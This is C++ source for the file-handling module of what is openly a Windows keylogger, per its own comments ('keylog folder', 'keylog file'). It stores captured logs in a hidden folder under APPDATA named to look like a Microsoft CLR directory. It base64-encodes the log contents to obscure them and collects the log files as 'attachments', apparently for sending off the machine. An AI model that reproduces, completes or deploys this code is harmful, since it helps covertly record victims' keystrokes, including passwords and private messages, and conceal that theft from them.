#include "Helper.h"
#include "Base64.h"

// Gets path of keylog folder
std::string IO::GetOutputPath(const bool append_seperator)
{
	std::string dir(getenv("APPDATA"));
	std::string full = dir + "\\Microsoft\\CLR";
	return full + (append_seperator ? "\\" : "");
}

// Creates new directory wihout checking for subdirectories
bool IO::MkOneDir(const std::string &path)
{
	return (bool)CreateDirectory(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
}

/**
 * Creates new directory
 * The reason it is weird is because it
 * generates all subdirectories defined
 * in a path without throwing an error
 **/
bool IO::MKDir(std::string path)
{
	for (char &c : path)
	{
		if (c == '\\')
		{
			c = '\0';
			if (!MkOneDir(path))
				return false;
			c = '\\';
		}
	}
	return true;
}

/**
 * Writes to new keylog file
 * Returns empty string if file failed to open
 **/
template <class T>
std::string IO::WriteLog(const T &t)
{
	std::string path = GetOutputPath(true);
	Helper::DateTime dt;
	std::string name = dt.GetDateTimeString("_") + ".log";

	try
	{
		std::ofstream out(path + name);
		if (!out)
			return "";
		std::ostringstream s;
		s << "[" << dt.GetDateTimeString() << "]" << std::endl
			<< t << std::endl;

		std::string data = Base64::EncryptB64(s.str());
		out << data;

		if (!out)
			return "";
		out.close();
		return name;
	}
	catch (...)
	{
		return "";
	}
}

// Gets all attatchments in output folder
std::vector<std::string> IO::GetAttatchments(const std::string &path)
{
	std::vector<std::string> ret;
	for (const auto &entry : std::filesystem::directory_iterator(path))
	{
		std::cout << entry.path() << std::endl;
		ret.push_back(Helper::ToString(entry.path()));
	}

	return ret;
}
